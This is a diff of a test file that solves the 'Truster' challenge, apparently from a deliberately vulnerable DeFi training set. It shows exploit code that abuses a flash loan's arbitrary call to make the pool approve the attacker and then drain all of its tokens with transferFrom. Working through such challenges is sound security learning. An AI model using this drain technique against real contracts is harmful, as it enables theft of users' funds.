@@ -42,20 +42,19 @@ describe("[Challenge] Truster", function () {
     //   .connect(attacker)
     //   .attack(this.pool.address, this.token.address);
     //alternative below with no separate contract//
-    console.log("attacker address is: ", attacker.address);
     const iface = new ethers.utils.Interface([
       "function approve(address spender, uint256 amount)",
     ]);
     const data = iface.encodeFunctionData("approve", [
-      attacker.address.toString(),
+      attacker.address,
       TOKENS_IN_POOL,
     ]);
     await this.pool
       .connect(attacker)
-      .flashLoan(0, attacker, this.token.address, data);
+      .flashLoan(0, attacker.address, this.token.address, data);
     await this.token
       .connect(attacker)
-      .transferFrom(this.pool.address, attacker, TOKENS_IN_POOL);
+      .transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
   });
 
   after(async function () {
